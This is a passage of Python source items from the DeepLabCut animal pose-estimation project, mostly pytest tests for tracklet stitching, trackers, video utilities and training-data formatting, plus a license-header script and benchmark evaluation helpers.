    tracklet = fake_tracklet()
    tracklet_single = Tracklet(tracklet.data[:, :1], tracklet.inds)
    return (tracklet, tracklet_single)"
AlexEMG/DeepLabCut,fake_stitcher,"@pytest.fixture()
def fake_stitcher():
    inds = np.arange(TRACKLET_LEN)
    data = np.random.rand(inds.size, N_DETS, 3)
    track = Tracklet(data, inds)
    idx = np.linspace(0, inds.size, N_TRACKLETS + 1, dtype=int)
    tracklets = TrackletStitcher.split_tracklet(track, idx[1:-1])
    return TrackletStitcher(tracklets, n_tracks=2)"
AlexEMG/DeepLabCut,test_tracklet_wrong_inputs,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_tracklet_wrong_inputs(tracklet):
    with pytest.raises(ValueError):
        _ = Tracklet(tracklet.data[..., :2], tracklet.inds)
    with pytest.raises(ValueError):
        _ = Tracklet(tracklet.data[:TRACKLET_LEN - 2], tracklet.inds)"
AlexEMG/DeepLabCut,test_tracklet_monotonic_indices,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_tracklet_monotonic_indices(tracklet):
    tracklet_inv = Tracklet(tracklet.data[::-1], tracklet.inds[::-1])
    np.testing.assert_equal(tracklet.inds, tracklet_inv.inds)
    np.testing.assert_equal(tracklet.xy, tracklet_inv.xy)"
AlexEMG/DeepLabCut,test_tracklet,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_tracklet(tracklet):
    assert len(tracklet) == TRACKLET_LEN
    assert tracklet.likelihood == 1
    assert tracklet.identity == TRACKLET_ID
    assert tracklet.start == TRACKLET_START
    assert tracklet.end == TRACKLET_START + TRACKLET_LEN - 1
    np.testing.assert_equal(tracklet.centroid, np.full((TRACKLET_LEN, 2), np.arange(tracklet.data.shape[1]).mean()))
    tracklet2 = Tracklet(tracklet.data, tracklet.inds + TRACKLET_LEN)
    assert tracklet not in tracklet2
    tracklet_new = tracklet + tracklet2
    tracklet_new -= tracklet
    np.testing.assert_equal(tracklet_new.data, tracklet2.data)
    np.testing.assert_equal(tracklet_new.inds, tracklet2.inds)
    tracklet2 = tracklet + tracklet
    assert tracklet2.contains_duplicates()"
AlexEMG/DeepLabCut,test_tracklet_default_identity,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_tracklet_default_identity(tracklet):
    tracklet.data = tracklet.data[..., :3]
    assert tracklet.identity == -1"
AlexEMG/DeepLabCut,test_tracklet_data_access,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_tracklet_data_access(tracklet):
    np.testing.assert_equal(tracklet.get_data_at(TRACKLET_START), tracklet.data[0])
    tracklet.set_data_at(TRACKLET_START + 1, tracklet.data[0] * 2)
    np.testing.assert_equal(tracklet.data[1], tracklet.data[0] * 2)
    tracklet.del_data_at(TRACKLET_START + 1)
    assert not tracklet.is_continuous
    assert TRACKLET_START + 1 not in tracklet.inds"
AlexEMG/DeepLabCut,test_tracklet_calc_velocity,"@pytest.mark.parametrize('tracklet, where, norm', list(zip(make_fake_tracklets(), ('head', 'tail'), (False, True))))
def test_tracklet_calc_velocity(tracklet, where, norm):
    _ = tracklet.calc_velocity(where, norm)"
AlexEMG/DeepLabCut,test_tracklet_calc_rate_of_turn,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_tracklet_calc_rate_of_turn(tracklet):
    for where in ('head', 'tail'):
        _ = tracklet.calc_rate_of_turn(where)"
AlexEMG/DeepLabCut,test_tracklet_affinities,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_tracklet_affinities(tracklet):
    other_tracklet = Tracklet(tracklet.data, tracklet.inds + TRACKLET_LEN)
    _ = tracklet.dynamic_similarity_with(other_tracklet)
    _ = tracklet.dynamic_dissimilarity_with(other_tracklet)
    _ = tracklet.shape_dissimilarity_with(other_tracklet)
    _ = tracklet.box_overlap_with(other_tracklet)
    _ = tracklet.motion_affinity_with(other_tracklet)
    _ = tracklet.distance_to(other_tracklet)"
AlexEMG/DeepLabCut,test_stitcher_wrong_inputs,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_stitcher_wrong_inputs(tracklet):
    with pytest.raises(IOError):
        _ = TrackletStitcher([], n_tracks=2)
    with pytest.raises(ValueError):
        _ = TrackletStitcher([tracklet], n_tracks=2, min_length=2)"
AlexEMG/DeepLabCut,test_purify_tracklets,"@pytest.mark.parametrize('tracklet', make_fake_tracklets())
def test_purify_tracklets(tracklet):
    tracklet.data = np.full_like(tracklet.data, np.nan)
    assert TrackletStitcher.purify_tracklet(tracklet) is None
    tracklet.data[0] = 1
    tracklet_pure = TrackletStitcher.purify_tracklet(tracklet)
    assert len(tracklet_pure) == 1
    assert tracklet_pure.inds == tracklet.inds[0]"
AlexEMG/DeepLabCut,test_stitcher,"def test_stitcher(tmpdir_factory, fake_stitcher):
    assert len(fake_stitcher) == N_TRACKLETS
    assert fake_stitcher.n_frames == TRACKLET_LEN
    assert fake_stitcher.compute_max_gap(fake_stitcher.tracklets) == 1
    fake_stitcher.build_graph(max_gap=1)
    fake_stitcher.stitch(add_back_residuals=True)
    output_name = tmpdir_factory.mktemp('data').join('fake.h5')
    fake_stitcher.write_tracks(output_name)
    fake_stitcher.G.remove_edge('source', '0in')
    with pytest.warns(UserWarning):
        fake_stitcher.stitch(add_back_residuals=True)"
AlexEMG/DeepLabCut,test_stitcher_plot,"def test_stitcher_plot(fake_stitcher):
    fake_stitcher.build_graph(max_gap=1)
    fake_stitcher.draw_graph(with_weights=True)
    fake_stitcher.stitch(add_back_residuals=True)
    fake_stitcher.plot_tracklets()
    fake_stitcher.plot_paths()
    fake_stitcher.plot_tracks()"
AlexEMG/DeepLabCut,test_tracklet_interpolate,"def test_tracklet_interpolate(real_tracklets):
    data = np.stack(list(real_tracklets[0].values()))[:10]
    inds = np.arange(len(data))
    gap = 2
    inds[len(inds) // 2:] += gap
    tracklet = Tracklet(data, inds)
    assert len(tracklet) == len(data)
    new_tracklet = tracklet.interpolate(max_gap=1)
    assert len(new_tracklet) == len(data)
    new_tracklet = tracklet.interpolate(max_gap=gap)
    assert len(new_tracklet) == len(data) + gap
    missing_inds = list(set(range(inds.max())).difference(inds))
    assert np.all(new_tracklet.data[missing_inds, :, 2] == 0.5)"
AlexEMG/DeepLabCut,test_stitcher_real,"def test_stitcher_real(tmpdir_factory, real_tracklets):
    stitcher = TrackletStitcher.from_dict_of_dict(real_tracklets, n_tracks=3)
    assert len(stitcher) == 3
    assert all((tracklet.is_continuous for tracklet in stitcher.tracklets))
    assert all((tracklet.identity == -1 for tracklet in stitcher.tracklets))
    assert not stitcher.residuals
    assert stitcher.compute_max_gap(stitcher.tracklets) == 0
    stitcher.build_graph()
    assert stitcher.G.number_of_edges() == 9
    assert all((weight is None for (*_, weight) in stitcher.G.edges.data('weight')))
    stitcher.stitch()
    assert len(stitcher.tracks) == 3
    assert all((len(track) == 50 for track in stitcher.tracks))
    assert all((0.998 <= track.likelihood <= 1 for track in stitcher.tracks))
    output_name = tmpdir_factory.mktemp('data').join('fake.h5')
    stitcher.write_tracks(output_name, ['mickey', 'minnie', 'bianca'])"
AlexEMG/DeepLabCut,test_stitcher_montblanc,"def test_stitcher_montblanc(real_tracklets_montblanc):
    stitcher = TrackletStitcher.from_dict_of_dict(real_tracklets_montblanc, n_tracks=3)
    assert len(stitcher) == 5
    assert all((tracklet.is_continuous for tracklet in stitcher.tracklets))
    assert all((tracklet.identity == -1 for tracklet in stitcher.tracklets))
    assert len(stitcher.residuals) == 1
    assert len(stitcher.residuals[0]) == 2
    assert stitcher.compute_max_gap(stitcher.tracklets) == 5
    stitcher.build_graph()
    assert stitcher.G.number_of_edges() == 18
    weights = [w for (*_, w) in stitcher.G.edges.data('weight') if w]
    assert weights == [2453, 24498, 5428]
    stitcher.stitch()
    assert len(stitcher.tracks) == 3
    assert all((len(track) >= 176 for track in stitcher.tracks))
    assert all((0.996 <= track.likelihood <= 1 for track in stitcher.tracks))
    df_gt = pd.read_hdf('tests/data/montblanc_tracks.h5')
    df = stitcher.format_df()
    np.testing.assert_equal(df.to_numpy(), df_gt.to_numpy())"
AlexEMG/DeepLabCut,test_stitcher_with_identity,"def test_stitcher_with_identity(real_tracklets):
    for i in range(3):
        tracklet = real_tracklets[i]
        for v in tracklet.values():
            v[:, -1] = i
    stitcher = TrackletStitcher.from_dict_of_dict(real_tracklets, n_tracks=3)
    tracklets = sorted(stitcher, key=lambda t: t.identity)
    assert all((tracklet.identity == i for (i, tracklet) in enumerate(tracklets)))
    tracklets = [t for track in stitcher for t in stitcher.split_tracklet(track, [25])]
    stitcher = TrackletStitcher(tracklets, n_tracks=3)
    assert len(stitcher) == 6
    stitcher.build_graph()
    weight = stitcher.G.edges['0out', '3in']['weight']

    def weight_func(t1, t2):
        w = 0.01 if t1.identity == t2.identity else 1
        return w * t1.distance_to(t2)
    stitcher.build_graph(weight_func=weight_func)
    assert stitcher.G.number_of_edges() == 27
    new_weight = stitcher.G.edges['0out', '3in']['weight']
    assert new_weight == weight // 100
    stitcher.stitch()
    assert len(stitcher.tracks) == 3
    assert all((len(track) == 50 for track in stitcher.tracks))
    assert all((0.998 <= track.likelihood <= 1 for track in stitcher.tracks))
    tracks = sorted(stitcher.tracks, key=lambda t: t.identity)
    assert all((track.identity == i for (i, track) in enumerate(tracks)))"
AlexEMG/DeepLabCut,weight_func,"def weight_func(t1, t2):
    w = 0.01 if t1.identity == t2.identity else 1
    return w * t1.distance_to(t2)"
AlexEMG/DeepLabCut,ellipse,"@pytest.fixture()
def ellipse():
    params = {'x': 0, 'y': 0, 'width': 2, 'height': 4, 'theta': np.pi / 2}
    return trackingutils.Ellipse(**params)"
AlexEMG/DeepLabCut,test_ellipse,"def test_ellipse(ellipse):
    assert ellipse.aspect_ratio == 2
    np.testing.assert_equal(ellipse.contains_points(np.asarray([[0, 0], [10, 10]])), [True, False])"
AlexEMG/DeepLabCut,test_ellipse_similarity,"def test_ellipse_similarity(ellipse):
    assert ellipse.calc_similarity_with(ellipse) == 1"
AlexEMG/DeepLabCut,test_ellipse_fitter,"def test_ellipse_fitter():
    fitter = trackingutils.EllipseFitter()
    assert fitter.fit(np.random.rand(2, 2)) is None
    xy = np.asarray([[-2, 0], [2, 0], [0, 1], [0, -1]], dtype=float)
    assert fitter.fit(xy) is not None
    fitter.sd = 0
    el = fitter.fit(xy)
    assert np.isclose(el.parameters, [0, 0, 4, 2, 0]).all()"
AlexEMG/DeepLabCut,test_ellipse_tracker,"def test_ellipse_tracker(ellipse):
    tracker1 = trackingutils.EllipseTracker(ellipse.parameters)
    tracker2 = trackingutils.EllipseTracker(ellipse.parameters)
    assert tracker1.id != tracker2.id
    tracker1.update(ellipse.parameters)
    assert tracker1.hit_streak == 1
    state = tracker1.predict()
    np.testing.assert_equal(ellipse.parameters, state)
    _ = tracker1.predict()
    assert tracker1.hit_streak == 0"
AlexEMG/DeepLabCut,test_sort_ellipse,"def test_sort_ellipse():
    tracklets = dict()
    mot_tracker = trackingutils.SORTEllipse(1, 1, 0.6)
    poses = np.random.rand(2, 10, 3)
    trackers = mot_tracker.track(poses[..., :2])
    assert trackers.shape == (2, 7)
    trackingutils.fill_tracklets(tracklets, trackers, poses, imname=0)
    assert all((id_ in tracklets for id_ in trackers[:, -2]))
    assert all((np.array_equal(tracklets[n][0], pose) for (n, pose) in enumerate(poses)))"
AlexEMG/DeepLabCut,test_tracking_ellipse,"def test_tracking_ellipse(real_assemblies, real_tracklets):
    tracklets_ref = real_tracklets.copy()
    _ = tracklets_ref.pop('header', None)
    tracklets = dict()
    mot_tracker = trackingutils.SORTEllipse(1, 1, 0.6)
    for (ind, assemblies) in real_assemblies.items():
        animals = np.stack([ass.data for ass in assemblies])
        trackers = mot_tracker.track(animals[..., :2])
        trackingutils.fill_tracklets(tracklets, trackers, animals, ind)
    assert len(tracklets) == len(tracklets_ref)
    assert [len(tracklet) for tracklet in tracklets.values()] == [len(tracklet) for tracklet in tracklets_ref.values()]
    assert all((t.shape[1] == 4 for tracklet in tracklets.values() for t in tracklet.values()))"
AlexEMG/DeepLabCut,test_box_tracker,"def test_box_tracker():
    bbox = (0, 0, 100, 100)
    tracker1 = trackingutils.BoxTracker(bbox)
    tracker2 = trackingutils.BoxTracker(bbox)
    assert tracker1.id != tracker2.id
    tracker1.update(bbox)
    assert tracker1.hit_streak == 1
    state = tracker1.predict()
    np.testing.assert_equal(bbox, state)
    _ = tracker1.predict()
    assert tracker1.hit_streak == 0"
AlexEMG/DeepLabCut,test_tracking_box,"def test_tracking_box(real_assemblies, real_tracklets):
    tracklets_ref = real_tracklets.copy()
    _ = tracklets_ref.pop('header', None)
    tracklets = dict()
    mot_tracker = trackingutils.SORTBox(1, 1, 0.1)
    for (ind, assemblies) in real_assemblies.items():
        animals = np.stack([ass.data for ass in assemblies])
        bboxes = trackingutils.calc_bboxes_from_keypoints(animals)
        trackers = mot_tracker.track(bboxes)
        trackingutils.fill_tracklets(tracklets, trackers, animals, ind)
    assert len(tracklets) == len(tracklets_ref)
    assert [len(tracklet) for tracklet in tracklets.values()] == [len(tracklet) for tracklet in tracklets_ref.values()]
    assert all((t.shape[1] == 4 for tracklet in tracklets.values() for t in tracklet.values()))"
AlexEMG/DeepLabCut,test_tracking_montblanc,"def test_tracking_montblanc(real_assemblies_montblanc, real_tracklets_montblanc):
    tracklets_ref = real_tracklets_montblanc.copy()
    _ = tracklets_ref.pop('header', None)
    tracklets = dict()
    tracklets['single'] = real_assemblies_montblanc[1]
    mot_tracker = trackingutils.SORTEllipse(1, 1, 0.6)
    for (ind, assemblies) in real_assemblies_montblanc[0].items():
        animals = np.stack([ass.data for ass in assemblies])
        trackers = mot_tracker.track(animals[..., :2])
        trackingutils.fill_tracklets(tracklets, trackers, animals, ind)
    assert len(tracklets) == len(tracklets_ref)
    assert [len(tracklet) for tracklet in tracklets.values()] == [len(tracklet) for tracklet in tracklets_ref.values()]
    for (k, assemblies) in tracklets.items():
        ref = tracklets_ref[k]
        for (ind, data) in assemblies.items():
            frame = f'frame{str(ind).zfill(3)}' if k != 'single' else ind
            np.testing.assert_equal(data, ref[frame])"
AlexEMG/DeepLabCut,test_calc_bboxes_from_keypoints,"def test_calc_bboxes_from_keypoints():
    xy = np.asarray([[[0, 0, 1]]])
    np.testing.assert_equal(trackingutils.calc_bboxes_from_keypoints(xy, 10), [[-10, -10, 10, 10, 1]])
    np.testing.assert_equal(trackingutils.calc_bboxes_from_keypoints(xy, 20, 10), [[-10, -20, 30, 20, 1]])
    width = 200
    height = width * 2
    xyp = np.zeros((1, 2, 3))
    xyp[:, 1, :2] = (width, height)
    xyp[:, 1, 2] = 1
    with pytest.raises(ValueError):
        _ = trackingutils.calc_bboxes_from_keypoints(xyp[..., :2])
    bboxes = trackingutils.calc_bboxes_from_keypoints(xyp)
    np.testing.assert_equal(bboxes, [[0, 0, width, height, 0.5]])
    slack = 20
    bboxes = trackingutils.calc_bboxes_from_keypoints(xyp, slack=slack)
    np.testing.assert_equal(bboxes, [[-slack, -slack, width + slack, height + slack, 0.5]])
    offset = 50
    bboxes = trackingutils.calc_bboxes_from_keypoints(xyp, offset=offset)
    np.testing.assert_equal(bboxes, [[offset, 0, width + offset, height, 0.5]])"
AlexEMG/DeepLabCut,test_read_image_shape_fast,"def test_read_image_shape_fast(tmp_path):
    path_rgb_image = os.path.join(TEST_DATA_DIR, 'image.png')
    img = imread(path_rgb_image, mode='skimage')
    shape = img.shape
    assert read_image_shape_fast(path_rgb_image) == (shape[2], shape[0], shape[1])
    path_gray_image = str(tmp_path / 'gray.png')
    io.imsave(path_gray_image, color.rgb2gray(img).astype(np.uint8))
    assert read_image_shape_fast(path_gray_image) == (1, shape[0], shape[1])"
AlexEMG/DeepLabCut,test_split_trials,"def test_split_trials():
    n_rows = 123
    train_fractions = np.arange(50, 96) / 100
    for frac in train_fractions:
        (train_inds, test_inds) = SplitTrials(range(n_rows), frac, enforce_train_fraction=True)
        assert len(train_inds) / (len(train_inds) + len(test_inds)) == frac
        train_inds = train_inds[train_inds != -1]
        test_inds = test_inds[test_inds != -1]
        assert len(train_inds) + len(test_inds) == n_rows"
AlexEMG/DeepLabCut,test_format_training_data,"def test_format_training_data(monkeypatch):
    fake_shape = (3, 480, 640)
    monkeypatch.setattr(trainingsetmanipulation, 'read_image_shape_fast', lambda _: fake_shape)
    df = pd.read_hdf(os.path.join(TEST_DATA_DIR, 'trimouse_calib.h5')).xs('mus1', level='individuals', axis=1)
    guarantee_multiindex_rows(df)
    train_inds = list(range(10))
    (_, data) = format_training_data(df, train_inds, 12, '')
    assert len(data) == len(train_inds)
    assert all((len(d) == 3 for d in data))
    assert all((d[0].size == 3 and d[0].dtype.char == 'U' and d[0][0, -1].endswith('.png') for d in data))
    assert all((np.all(d[1] == np.array(fake_shape)[None]) for d in data))
    assert all((d[2][0, 0].shape[1] == 3 and d[2][0, 0].dtype == np.int64 for d in data))"
AlexEMG/DeepLabCut,test_format_multianimal_training_data,"def test_format_multianimal_training_data(monkeypatch):
    fake_shape = (3, 480, 640)
    monkeypatch.setattr(multiple_individuals_trainingsetmanipulation, 'read_image_shape_fast', lambda _: fake_shape)
    df = pd.read_hdf(os.path.join(TEST_DATA_DIR, 'trimouse_calib.h5'))
    guarantee_multiindex_rows(df)
    train_inds = list(range(10))
    n_decimals = 1
    data = format_multianimal_training_data(df, train_inds, '', n_decimals)
    assert len(data) == len(train_inds)
    assert all((isinstance(d, dict) for d in data))
    assert all((len(d['image']) == 3 for d in data))
    assert all((np.all(d['size'] == np.array(fake_shape)) for d in data))
    assert all((xy.shape[1] == 3 and np.isfinite(xy).all() for d in data for xy in d['joints'].values()))"
AlexEMG/DeepLabCut,stereo_params,"@pytest.fixture(scope='session')
def stereo_params():
    params = dict()
    for i in range(1, 3):
        params[f'cameraMatrix{i}'] = np.random.rand(3, 3)
        params[f'distCoeffs{i}'] = np.random.rand(1, 5)
        params[f'P{i}'] = np.random.rand(3, 4)
        params[f'R{i}'] = np.eye(3)
    return params"
AlexEMG/DeepLabCut,test_undistort_points,"def test_undistort_points(stereo_params):
    points = np.random.rand(100, 20 * 3)
    points_undistorted = triangulation._undistort_points(points, stereo_params['cameraMatrix1'], stereo_params['distCoeffs1'], stereo_params['P1'], stereo_params['R1'])
    assert np.shape(points_undistorted) == np.shape(points)"
AlexEMG/DeepLabCut,test_undistort_views,"@pytest.mark.parametrize('n_view_pairs, is_multi', [(i, flag) for i in range(1, 7, 2) for flag in (False, True)])
def test_undistort_views(n_view_pairs, is_multi, stereo_params):
    df = pd.read_hdf('tests/data/montblanc_tracks.h5')
    if not is_multi:
        df = df.xs('bird1', level='individuals', axis=1)
    view_pairs = [(df, df) for _ in range(n_view_pairs)]
    cam_params = {f'camera-1-camera-{i}': stereo_params for i in range(2, n_view_pairs + 2)}
    dfs = triangulation._undistort_views(view_pairs, cam_params)
    assert len(dfs) == n_view_pairs
    assert all((len(pair) == 2 for pair in dfs))
    assert len(dfs[0][0].columns.levels) == (4 if is_multi else 3)"
AlexEMG/DeepLabCut,video_clip,"@pytest.fixture()
def video_clip():
    return VideoWriter(os.path.join(TEST_DATA_DIR, 'vid.avi'))"
AlexEMG/DeepLabCut,test_reader_wrong_inputs,"def test_reader_wrong_inputs(tmp_path):
    with pytest.raises(ValueError):
        VideoWriter(str(tmp_path))
    fake_vid = tmp_path / 'fake.avi'
    fake_vid.write_bytes(b'42')
    with pytest.raises(IOError):
        VideoWriter(str(fake_vid))"
AlexEMG/DeepLabCut,test_reader_check_integrity,"def test_reader_check_integrity(video_clip):
    video_clip.check_integrity()
    log_file = os.path.join(video_clip.directory, f'{video_clip.name}.log')
    assert os.path.getsize(log_file) == 0"
AlexEMG/DeepLabCut,test_reader_video_path,"def test_reader_video_path(video_clip):
    assert video_clip.name == 'vid'
    assert video_clip.format == '.avi'
    assert video_clip.directory == TEST_DATA_DIR"
AlexEMG/DeepLabCut,test_reader_metadata,"def test_reader_metadata(video_clip):
    metadata = video_clip.metadata
    assert metadata['n_frames'] == video_clip.get_n_frames(True) == 256
    assert metadata['fps'] == 30
    assert metadata['width'] == 416
    assert metadata['height'] == 374"
AlexEMG/DeepLabCut,test_reader_wrong_fps,"def test_reader_wrong_fps(video_clip):
    with pytest.raises(ValueError):
        video_clip.fps = 0"
AlexEMG/DeepLabCut,test_reader_duration,"def test_reader_duration(video_clip):
    assert video_clip.calc_duration() == pytest.approx(video_clip.calc_duration(robust=False), abs=0.01)"
AlexEMG/DeepLabCut,test_reader_set_frame,"def test_reader_set_frame(video_clip):
    with pytest.raises(ValueError):
        video_clip.set_to_frame(-1)
    video_clip.set_to_frame(2)
    assert int(video_clip.video.get(POS_FRAMES)) == 2
    video_clip.set_to_frame(len(video_clip) + 10)
    assert int(video_clip.video.get(POS_FRAMES)) == len(video_clip) - 1
    video_clip.reset()
    assert int(video_clip.video.get(POS_FRAMES)) == 0"
AlexEMG/DeepLabCut,test_reader_read_frame,"@pytest.mark.parametrize('shrink, crop', [(1, False), (1, True), (2, False), (2, True)])
def test_reader_read_frame(video_clip, shrink, crop):
    if crop:
        video_clip.set_bbox(0, 0.5, 0, 0.5, relative=True)
    frame = video_clip.read_frame(shrink, crop)
    (height, width, _) = frame.shape
    assert height == video_clip.height // shrink
    assert width == video_clip.width // shrink"
AlexEMG/DeepLabCut,test_writer_bbox,"def test_writer_bbox(video_clip):
    bbox = (0, 100, 0, 100)
    video_clip.set_bbox(*bbox)
    assert video_clip.get_bbox() == bbox
    with pytest.raises(ValueError):
        video_clip.set_bbox(200, 100, 0, 100, relative=False)
    video_clip.set_bbox(0, 1, 0, 1.01, relative=True)
    assert video_clip.get_bbox(relative=True) == (0, 1, 0, 1)"
AlexEMG/DeepLabCut,test_writer_shorten_invalid_timestamps,"@pytest.mark.parametrize('start, end', [(0, 10), ('0:0', '0:10'), ('00:00:00', '00:00:10')])
def test_writer_shorten_invalid_timestamps(video_clip, start, end):
    with pytest.raises(ValueError):
        video_clip.shorten(start, end)"
AlexEMG/DeepLabCut,test_writer_shorten,"def test_writer_shorten(tmp_path, video_clip):
    file = video_clip.shorten('00:00:00', '00:00:02', dest_folder=str(tmp_path))
    vid = VideoWriter(file)
    assert pytest.approx(vid.calc_duration(), abs=0.1) == 2"
AlexEMG/DeepLabCut,test_writer_split,"def test_writer_split(tmp_path, video_clip):
    with pytest.raises(ValueError):
        video_clip.split(1)
    n_splits = 3
    clips = video_clip.split(n_splits, dest_folder=str(tmp_path))
    assert len(clips) == n_splits
    vid = VideoWriter(clips[0])
    assert pytest.approx(len(vid), abs=1) == len(video_clip) // n_splits"
AlexEMG/DeepLabCut,test_writer_crop,"def test_writer_crop(tmp_path, video_clip):
    (x1, x2, y1, y2) = (0, 50, 0, 100)
    video_clip.set_bbox(x1, x2, y1, y2)
    file = video_clip.crop(dest_folder=str(tmp_path))
    vid = VideoWriter(file)
    assert vid.dimensions == (x2 - x1, y2 - y1)"
AlexEMG/DeepLabCut,test_writer_rescale,"@pytest.mark.parametrize('target_height', [200, 177])
def test_writer_rescale(tmp_path, video_clip, target_height):
    file = video_clip.rescale(width=-1, height=target_height, dest_folder=str(tmp_path))
    vid = VideoWriter(file)
    assert vid.height == target_height
    ar = video_clip.height / target_height
    assert vid.width == pytest.approx(video_clip.width // ar, abs=1)"
AlexEMG/DeepLabCut,test_download_huggingface_model,"def test_download_huggingface_model(tmp_path_factory, model='full_cat'):
    folder = tmp_path_factory.mktemp('temp')
    dlclibrary.download_huggingface_model(model, str(folder))
    assert os.path.exists(folder / 'pose_cfg.yaml')
    assert any((f.startswith('snapshot-') for f in os.listdir(folder)))
    assert not any((f.startswith('models--') for f in os.listdir(folder)))"
AlexEMG/DeepLabCut,test_download_huggingface_wrong_model,"def test_download_huggingface_wrong_model():
    with pytest.raises(ValueError):
        dlclibrary.download_huggingface_model('wrong_model_name')"
AlexEMG/DeepLabCut,test_download_all_models,"@pytest.mark.skip
@pytest.mark.parametrize('model', MODELOPTIONS)
def test_download_all_models(tmp_path_factory, model):
    test_download_huggingface_model(tmp_path_factory, model)"
AlexEMG/DeepLabCut,load_config,"def load_config(filename):
    with open(filename, 'r') as fh:
        config = yaml.safe_load(fh)
    return config"
AlexEMG/DeepLabCut,walk_directory,"def walk_directory(entry):
    """"""Talk the directory""""""
    if 'header' not in entry:
        raise ValueError('Current entry does not have a header.')
    if 'include' not in entry:
        raise ValueError('Current entry does not have an include list.')

    def _list_include():
        """"""List all files specified in the include list.""""""
        for include_pattern in entry['include']:
            for filename in glob.iglob(include_pattern, recursive=True):
                yield filename

    def _filter_exclude(iterable):
        """"""Filter filenames from an iterator by the exclude patterns.""""""
        for filename in iterable:
            for exclude_pattern in entry.get('exclude', []):
                if fnmatch.fnmatch(filename, exclude_pattern):
                    break
            else:
                yield filename
    files = _filter_exclude(set(_list_include()))
    return list(files)"
AlexEMG/DeepLabCut,main,"def main(input_file='NOTICE.yml'):
    config = load_config(input_file)
    for entry in config:
        filelist = list(walk_directory(entry))
        with tempfile.NamedTemporaryFile(mode='w') as header_file:
            header_file.write(entry['header'])
            header_file.flush()
            header_file.seek(0)
            command = ['licenseheaders', '-t', str(header_file.name), '-f'] + filelist
            result = subprocess.run(command, capture_output=True)
            if result.returncode != 0:
                print(result.stdout.decode())
                print(result.stderr.decode())"
AlexEMG/DeepLabCut,_list_include,"def _list_include():
    """"""List all files specified in the include list.""""""
    for include_pattern in entry['include']:
        for filename in glob.iglob(include_pattern, recursive=True):
            yield filename"
AlexEMG/DeepLabCut,_filter_exclude,"def _filter_exclude(iterable):
    """"""Filter filenames from an iterator by the exclude patterns.""""""
    for filename in iterable:
        for exclude_pattern in entry.get('exclude', []):
            if fnmatch.fnmatch(filename, exclude_pattern):
                break
        else:
            yield filename"
AlexEMG/DeepLabCut,register,"def register(cls):
    """"""Add a benchmark to the list of evaluations to run.

    Apply this function as a decorator to a class. Note that the
    class needs to be a subclass of the ``benchmark.base.Benchmark``
    base class.

    In most situations, it will be a subclass of one of the pre-defined
    benchmarks in ``benchmark.benchmarks``.

    Throws:
        ``ValueError`` if the decorator is applied to a class that is
        not a subclass of ``benchmark.base.Benchmark``.
    """"""
    if not issubclass(cls, Benchmark):
        raise ValueError(f'Can only register subclasses of {type(Benchmark)}, but got {cls}.')
    __registry.append(cls)"
AlexEMG/DeepLabCut,evaluate,"def evaluate(include_benchmarks: Container[str]=None, results: ResultCollection=None, on_error='return') -> ResultCollection:
    """"""Run evaluation for all benchmarks and methods.

    Note that in order for your custom benchmark to be included during
    evaluation, the following conditions need to be met:

        - The benchmark subclassed one of the benchmark definitions in
          in ``benchmark.benchmarks``
        - The benchmark is registered by applying the ``@benchmark.register``
          decorator to the class
        - The benchmark was imported. This is done automatically for all
          benchmarks that are defined in submodules or subpackages of the
          ``benchmark.submissions`` module. For all other locations, make
          sure to manually import the packages **before** calling the
          ``evaluate()`` function.

    Args:
        include_benchmarks:
            If ``None``, run all benchmarks that were discovered. If a container
            is passed, only include methods that were defined on benchmarks with
            the specified names. E.g., ``include_benchmarks = [""trimouse""]`` would
            only evaluate methods of the trimouse benchmark dataset.
        on_error:
            see documentation in ``benchmark.base.Benchmark.evaluate()``

    Returns:
        A collection of all results, which can be printed or exported to
        ``pd.DataFrame`` or ``json`` file formats.
    """"""
    if results is None:
        results = ResultCollection()
    for benchmark_cls in __registry:
        if include_benchmarks is not None:
            if benchmark_cls.name not in include_benchmarks:
                continue
        benchmark = benchmark_cls()
        for name in benchmark.names():
            if Result(method_name=name, benchmark_name=benchmark_cls.name) in results:
                continue
            else:
                result = benchmark.evaluate(name, on_error=on_error)
                results.add(result)
    return results"
AlexEMG/DeepLabCut,get_filepath,"def get_filepath(basename: str):
    return os.path.join(DATA_ROOT, basename)"
AlexEMG/DeepLabCut,savecache,"def savecache(results: ResultCollection):
    with open(CACHE, 'w') as fh:
        json.dump(results.todicts(), fh, indent=2)"
AlexEMG/DeepLabCut,loadcache,"def loadcache(cache=CACHE, on_missing: Literal['raise', 'ignore']='ignore') -> ResultCollection:
    if not os.path.exists(cache):
        if on_missing == 'raise':
            raise FileNotFoundError(cache)
        return ResultCollection()
    with open(cache, 'r') as fh:
        try:
            data = json.load(fh)
        except json.decoder.JSONDecodeError as e:
            if on_missing == 'raise':
                raise e
            return ResultCollection()
    return ResultCollection.fromdicts(data)"
AlexEMG/DeepLabCut,names,"@abc.abstractmethod
def names(self):
    """"""A unique key to describe this submission, e.g. the model name.

        This is also the name that will later appear in the benchmark table.
        The name needs to be unique across the whole benchmark. Non-unique names
        will raise an error during submission of a PR.
        """"""
    raise NotImplementedError()"
AlexEMG/DeepLabCut,get_predictions,"@abc.abstractmethod
def get_predictions(self):
    """"""Return predictions for all images in the benchmark.""""""
    raise NotImplementedError()"
AlexEMG/DeepLabCut,__init__,"def __init__(self):
    keys = ['name', 'keypoints', 'ground_truth', 'metadata']
    for key in keys:
        if not hasattr(self, key):
            raise NotImplementedError(f'Subclass of abstract Benchmark class need to define the {key} property.')"
AlexEMG/DeepLabCut,compute_pose_rmse,"def compute_pose_rmse(self, results_objects):
    return deeplabcut.benchmark.metrics.calc_rmse_from_obj(results_objects, h5_file=self.ground_truth, metadata_file=self.metadata)"
AlexEMG/DeepLabCut,compute_pose_map,"def compute_pose_map(self, results_objects):
    return deeplabcut.benchmark.metrics.calc_map_from_obj(results_objects, h5_file=self.ground_truth, metadata_file=self.metadata)"
AlexEMG/DeepLabCut,evaluate,"def evaluate(self, name: str, on_error='raise'):
    """"""Evaluate this benchmark with all registered methods.""""""
    if name not in self.names():
        raise ValueError(f'{name} is not registered. Valid names are {self.names()}')
    if on_error not in ('ignore', 'return', 'raise'):
        raise ValueError(f'on_error got an undefined value: {on_error}')
    mean_avg_precision = float('nan')
